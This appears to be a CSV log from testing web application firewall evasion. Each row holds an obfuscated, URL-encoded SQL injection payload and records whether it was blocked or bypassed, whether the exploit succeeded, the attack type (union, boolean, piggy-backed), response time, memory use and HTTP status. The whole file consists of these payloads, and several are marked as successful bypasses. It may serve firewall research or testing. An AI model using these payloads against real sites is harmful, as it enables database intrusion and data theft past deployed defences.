Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0%27<@=.1+or%0bnot%0b{`if`%0b1}=1=%0b(not+{x%0b(select%0b1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0208,69.77,No,200
0'<@!=1%0bor%0bnot+{`if`+1}=1=+(!+{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0184,70.38,No,500
0'<@=1.+||+not+{a+1}=1=%0b(!~false)+||%27,Bypassed,No,None,Unknown,0.0104,70.38,No,500
0%27<@=1.+or+!+{a%0b1}=1=+(!+{x+(select+1)}=1)+,Blocked,No,None,Unknown,0.0067,70.38,No,403
0'<@=1%0bor+not%0btrue=+(0)%0b||%27,Bypassed,No,None,booleanAtk,0.0234,70.38,No,500
0%27<@=1.+||%0b!%0b{x+(select+1)}=1=+(not%0b{x%0b(select%0b1)}=1,Blocked,No,None,Unknown,0.0125,70.44,No,403
0%27<@=1.+||+not%0b1=%0b(false)%0bor',Bypassed,No,None,booleanAtk,0.0076,70.5,No,500
0%27<@=1+||+!~false=+(not+{`if`+1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0107,70.56,No,200
0%27<@=1+or%0bnot%0btrue=%0b(not+{x+(select+1)}=1)+||',Bypassed,No,None,booleanAtk,0.0199,70.63,No,500
0'<@!=1.+||+!%7e0=+(!+1)+or%27,Blocked,No,None,Unknown,0.0102,70.88,No,403
0%27<@!=1.+or+not+{x%0b(select+1)}=1=%0b(not+1)+or',Bypassed,No,None,Unknown,0.0122,70.88,No,500
0'<@!=1.%0bor%0b!+{x+(select+1)}=1=%0b(not%0b{x%0b(select%0b1)}=1),Bypassed,No,None,Unknown,0.0217,70.88,No,500
0%27<@!=.1%0b||+0=+(!%0btrue)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0082,70.88,No,200
0%27<@=1.+or%0b!%0b{`if`%0b1}=1=%0b(not+{`if`%0b1}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0145,70.88,No,200
0'<@!=1.+||+0=%0b(!+{`if`+1}=1)+||%27,Bypassed,No,None,Unknown,0.019,70.88,No,500
0%27<@=1.+||%0b!+{`if`%0b1}=1=+(not+{`if`%0b1}=1)+or',Bypassed,No,None,Unknown,0.017,70.88,No,500
0%27<@=1%0b||+not~0=+(!+{`if`+1}=1)%0b||',Bypassed,No,None,Unknown,0.013,70.88,No,500
0%27<@=1+||+!~false=%0b(not%0b{`if`+1}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0126,70.88,No,200
0'<@!=1.+or+!+{x+(select+1)}=1+is+false+||%27,Blocked,No,None,booleanAtk,0.0166,70.88,No,403
0%27<@!=1%0b||%0bnot+true=+(not~false)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0096,70.88,No,200
0%27<@=.1+or+!+true=+(not+{x+(select%0b1)}=1)+or%27,Blocked,No,None,booleanAtk,0.0072,70.88,No,403
0%27<@=1.+or+not+{x+(select%0b1)}=1=+(not+{x%0b(select%0b1)}=1),Blocked,No,None,Unknown,0.0059,70.88,No,403
0%27or%0b@<@.%0b||%0b!+{x%0b(select%0b1)}=1=%0b(!+{a+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0158,70.88,No,200
0'<@=1.%0bor%0b{x+(select%0b1)}=1%0blike%0b{x+(select%0b1)}=1%0b||',Bypassed,No,None,Unknown,0.0164,70.88,No,500
0'<@!=1.%0bor+not%0btrue=+(not+{a%0b1}=1)+or',Bypassed,No,None,booleanAtk,0.0259,70.88,No,500
0'<@=1%0bor%0b!%0btrue=+(!%0b{a%0b1}=1)%0b||',Bypassed,No,None,booleanAtk,0.0201,70.88,No,500
0'<@=1.%0bor%0b0=%0b(not%0b{x%0b(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0125,70.88,No,500
0%27<@!=1+or+not%7e0=+(not%0b{x%0b(select%0b1)}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0256,70.88,No,200
0%27<@!=1%0bor+not+{x+(select+1)}=1=%0b(not+{x+(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0168,70.88,No,200
0'<@=1.%0b||%0b!%0b{x+(select+1)}=1=+(!~false)%0bor%27,Bypassed,No,None,booleanAtk,0.0183,70.88,No,500
0'<@!=1%0b||%0bnot+{x%0b(select+1)}=1=%0b(!+{`if`+1}=1)%0b,Bypassed,No,None,Unknown,0.0185,70.88,No,500
0%27<@!=1.+or%0bnot+true=+(not+{a+1}=1)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.012,70.88,No,200
0%27<@!=1+||%0b!+{`if`+1}=1=%0b(not%0b{a+1}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0145,70.88,No,200
0'<@!=.1+||+!%0b{`if`%0b1}=1=%0b(!+{x+(select%0b1)}=1)+,Bypassed,No,None,Unknown,0.0179,70.88,No,500
0%27<@!=1+or+!%0b{`if`+1}=1=+(!%0b{a+1}=1)%0bor',Bypassed,No,None,Unknown,0.0141,70.88,No,500
0'<@!=.1%0bor%0b!%7efalse=+(not%0b{a+1}=1)+or',Bypassed,No,None,booleanAtk,0.0102,70.88,No,500
0'<@=1+or+not+{x%0b(select+1)}=1=+(not~0)+||%27,Bypassed,No,None,Unknown,0.0176,70.88,No,500
0'<@=1%0bor+not+{a+1}=1=+(!%0b{x%0b(select+1)}=1)--,Bypassed,No,None,piggyAtk,0.012,70.88,No,500
0%27<@!=1.+||+not%0b{x+(select+1)}=1=+(!%0b{x%0b(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0106,70.88,No,200
